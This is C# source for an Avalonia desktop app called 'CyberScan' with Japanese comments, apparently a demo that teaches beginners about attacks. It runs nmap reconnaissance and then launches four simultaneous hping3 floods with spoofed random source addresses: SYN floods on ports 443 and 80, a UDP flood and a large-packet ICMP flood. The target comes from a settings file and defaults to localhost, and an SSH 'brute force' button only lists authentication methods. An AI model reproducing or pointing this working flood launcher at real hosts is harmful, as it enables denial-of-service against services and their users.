using Avalonia;
using Avalonia.Controls;
using Avalonia.Input;
using Avalonia.Interactivity;
using Avalonia.Threading;
using System;
using System.Diagnostics;
using System.IO;
using System.Threading.Tasks;

namespace CyberScan
{
    public partial class MainWindow : Window
    {
        // デフォルト設定
        private string _targetIp = "127.0.0.1";
        private int _ddosDuration = 15; // デフォルト15秒
        
        // 設定ファイル名
        private const string ConfigFileName = "Settings.txt";

        public MainWindow()
        {
            InitializeComponent();
            
            // キーボードイベントとウィンドウ開始イベントの登録
            this.KeyDown += OnKeyDown;
            this.Opened += OnWindowOpened;
        }

        private void OnWindowOpened(object? sender, EventArgs e)
        {
            LoadSettings();
            WriteLog("SYSTEM INITIALIZED.");
            WriteLog($"TARGET LOCKED: {_targetIp}");
            WriteLog($"ATTACK TIMEOUT SET TO: {_ddosDuration} SECONDS");
            WriteLog("WAITING FOR USER AUTHORIZATION...");
        }

        // Settings.txt から設定を読み込む
        private void LoadSettings()
        {
            try
            {
                if (File.Exists(ConfigFileName))
                {
                    string[] lines = File.ReadAllLines(ConfigFileName);
                    foreach (string line in lines)
                    {
                        // コメント行や空行はスキップ
                        if (string.IsNullOrWhiteSpace(line) || line.StartsWith("#")) continue;

                        string[] parts = line.Split('=');
                        if (parts.Length == 2)
                        {
                            string key = parts[0].Trim();
                            string value = parts[1].Trim();

                            if (key.Equals("IP", StringComparison.OrdinalIgnoreCase))
                            {
                                _targetIp = value;
                            }
                            else if (key.Equals("DDoSTime", StringComparison.OrdinalIgnoreCase))
                            {
                                if (int.TryParse(value, out int duration))
                                {
                                    _ddosDuration = duration;
                                }
                            }
                        }
                    }
                }
                else
                {
                    // ファイルがない場合はデフォルト値で作成しておく
                    string defaultSettings = "IP=127.0.0.1\nDDoSTime=15";
                    File.WriteAllText(ConfigFileName, defaultSettings);
                    WriteLog($"[CONFIG] {ConfigFileName} not found. Created default.");
                }
            }
            catch (Exception ex)
            {
                WriteLog($"[ERROR] Config load failed: {ex.Message}");
            }
            
            // UI更新
            if (TargetIpDisplay != null)
            {
                TargetIpDisplay.Text = _targetIp;
            }
        }

        // キー操作 (Ctrl+Q: 終了, F11: フルスクリーン切替)
        private void OnKeyDown(object? sender, KeyEventArgs e)
        {
            if (e.KeyModifiers == KeyModifiers.Control && e.Key == Key.Q)
            {
                Close();
            }
            
            if (e.Key == Key.F11)
            {
                if (WindowState == WindowState.FullScreen)
                {
                    WindowState = WindowState.Normal;
                    SystemDecorations = SystemDecorations.Full;
                    Topmost = false;
                }
                else
                {
                    WindowState = WindowState.FullScreen;
                    SystemDecorations = SystemDecorations.None;
                    Topmost = true;
                }
            }
        }

        // --- フェーズ1: ポートスキャン (偵察) ---
        private async void OnScanClick(object sender, RoutedEventArgs e)
        {
            ScanButton.IsEnabled = false;
            StatusText.Text = "STATUS: SCANNING NETWORK...";
            StatusText.Foreground = Avalonia.Media.Brushes.Yellow;

            WriteLog("\n==========================================");
            WriteLog($"[*] INITIATING PORT SCAN ON {_targetIp}...");
            WriteLog("==========================================");

            // Nmap実行 (-F: 高速スキャン)
            await RunAttackToolAsync("nmap", $"-F -sV {_targetIp}");

            WriteLog("\n[SCAN COMPLETE] ANALYZING VULNERABILITIES...");
            
            // フェーズ切り替え
            Phase1Panel.IsVisible = false;
            Phase2Panel.IsVisible = true;
            
            // 攻撃ボタンを有効化
            DosAttackButton.IsEnabled = true; 
            BruteForceButton.IsEnabled = true;

            StatusText.Text = "STATUS: VULNERABILITY DETECTED. SELECT ACTION.";
            StatusText.Foreground = Avalonia.Media.Brushes.Red;
        }

        // --- フェーズ2A: DoS攻撃 (hping3 - 4並列実行) ---
        private async void OnDosAttackClick(object sender, RoutedEventArgs e)
        {
            DisableAttackButtons();
            StatusText.Text = "STATUS: EXECUTING MAXIMUM LOAD ATTACK...";
            StatusText.Foreground = Avalonia.Media.Brushes.Red; // 警告色

            WriteLog("\n==========================================");
            WriteLog($"[*] INITIATING MULTI-VECTOR FULL FLOOD...");
            WriteLog($"[*] DURATION LIMIT: {_ddosDuration} SECONDS");
            WriteLog("[!] WARNING: MAXIMIZING NETWORK SATURATION.");
            WriteLog("==========================================");

            // 攻撃コマンドの準備 (4つの異なるベクトルを同時展開)
            
            // 1. TCP SYN Flood (HTTPS/443) - Webサーバー処理負荷
            string args1 = $"{_ddosDuration}s hping3 -S -p 443 --flood --rand-source {_targetIp}";
            
            // 2. TCP SYN Flood (HTTP/80) - 別のWebポートへの負荷
            string args2 = $"{_ddosDuration}s hping3 -S -p 80 --flood --rand-source {_targetIp}";

            // 3. UDP Flood - 帯域幅の消費
            string args3 = $"{_ddosDuration}s hping3 --udp --flood --rand-source {_targetIp}";

            // 4. ICMP Large Packet Flood - パケット処理負荷
            string args4 = $"{_ddosDuration}s hping3 -1 --flood -d 1200 --rand-source {_targetIp}";

            WriteLog("\n[*] [THREAD 1] TCP SYN FLOOD (Target: Port 443)");
            WriteLog("[*] [THREAD 2] TCP SYN FLOOD (Target: Port 80)");
            WriteLog("[*] [THREAD 3] UDP FLOOD (Random Ports)");
            WriteLog("[*] [THREAD 4] ICMP PACKET FLOOD (Size: 1200)");

            // タスクを4並列で開始
            var task1 = RunAttackToolAsync("timeout", args1);
            var task2 = RunAttackToolAsync("timeout", args2);
            var task3 = RunAttackToolAsync("timeout", args3);
            var task4 = RunAttackToolAsync("timeout", args4);

            // すべての攻撃が終わるのを待つ
            await Task.WhenAll(task1, task2, task3, task4);

            WriteLog("\n[ATTACK STOPPED] ALL THREADS TERMINATED.");
            EnableAttackButtons();
            StatusText.Text = "STATUS: READY FOR NEXT COMMAND.";
        }

        // --- フェーズ2B: パスワードクラック (SSH) ---
        private async void OnBruteForceClick(object sender, RoutedEventArgs e)
        {
            DisableAttackButtons();
            StatusText.Text = "STATUS: CRACKING PASSWORDS...";

            WriteLog("\n==========================================");
            WriteLog("[*] INITIATING BRUTE FORCE ATTACK (SSH)...");
            WriteLog("==========================================");

            // 体験用にNmapのSSH認証確認スクリプトを実行
            await RunAttackToolAsync("nmap", $"-p 22 --script ssh-auth-methods {_targetIp}");

            WriteLog("\n[ATTACK FINISHED] ACCESS ATTEMPTS LOGGED.");
            EnableAttackButtons();
            StatusText.Text = "STATUS: READY FOR NEXT COMMAND.";
        }

        // --- リセット処理 ---
        private void OnResetClick(object sender, RoutedEventArgs e)
        {
            LogOutput.Text = "";
            Phase2Panel.IsVisible = false;
            Phase1Panel.IsVisible = true;
            ScanButton.IsEnabled = true;
            
            StatusText.Text = "STATUS: WAITING FOR COMMAND";
            StatusText.Foreground = Avalonia.Media.Brushes.Yellow;
            
            LoadSettings(); 
            WriteLog("SYSTEM RESET. READY.");
        }

        private void DisableAttackButtons()
        {
            DosAttackButton.IsEnabled = false;
            BruteForceButton.IsEnabled = false;
        }

        private void EnableAttackButtons()
        {
            DosAttackButton.IsEnabled = true;
            BruteForceButton.IsEnabled = true;
        }

        // コマンド実行エンジン
        private async Task RunAttackToolAsync(string command, string args)
        {
            try
            {
                var psi = new ProcessStartInfo
                {
                    FileName = command,
                    Arguments = args,
                    RedirectStandardOutput = true,
                    RedirectStandardError = true,
                    UseShellExecute = false,
                    CreateNoWindow = true
                };

                using var process = new Process { StartInfo = psi };

                process.OutputDataReceived += (s, e) => 
                {
                    if (e.Data != null)
                    {
                        var translated = TranslateForBeginner(e.Data);
                        Dispatcher.UIThread.Post(() => WriteLog(translated));
                    }
                };
                
                process.ErrorDataReceived += (s, e) =>
                {
                    if (e.Data != null) Dispatcher.UIThread.Post(() => WriteLog($"[STDERR] {e.Data}"));
                };

                process.Start();
                process.BeginOutputReadLine();
                process.BeginErrorReadLine();

                await process.WaitForExitAsync();
            }
            catch (Exception ex)
            {
                WriteLog($"[ERROR] Command Execution Failed: {ex.Message}");
                // ツールが入っていない場合のデモ用表示
                await Task.Delay(1000);
                
                if (command.Contains("hping3") || args.Contains("hping3"))
                {
                     WriteLog("[SIMULATION] Sending packet floods...");
                     WriteLog("[SIMULATION] Source IP: Random / Protocol: ICMP/TCP/UDP");
                }
                else if (command.Contains("thc-ssl-dos") || args.Contains("thc-ssl-dos"))
                {
                     WriteLog("[SIMULATION] Handshaking...");
                     WriteLog("[SIMULATION] Server is slowing down...");
                }
                else
                {
                    WriteLog("Target appears to be secure or tool not installed.");
                }
            }
        }

        // ログ翻訳ロジック
        private string TranslateForBeginner(string rawLog)
        {
            string output = rawLog;
            
            // Nmapの翻訳
            if (rawLog.Contains("80/tcp") && rawLog.Contains("open")) 
                output += "   <-- [発見] Webサーバー(HTTP)が動いています。";
            if (rawLog.Contains("443/tcp") && rawLog.Contains("open")) 
                output += "   <-- [発見] SSL Webサーバー(HTTPS)です。DoS攻撃の標的になります。";
            if (rawLog.Contains("22/tcp") && rawLog.Contains("open")) 
                output += "   <-- [発見] SSHポートです。パスワードクラック可能です。";
            
            // hping3 の翻訳
            if (rawLog.Contains("HPING"))
            {
                output = $"[攻撃開始] ターゲットへのフラッド攻撃(hping3)を開始しました。";
            }
            
            return output;
        }

        private void WriteLog(string message)
        {
            if (LogOutput == null || LogScrollViewer == null) return;
            LogOutput.Text += $"{message}\n";
            LogScrollViewer.ScrollToEnd();
        }
    }
}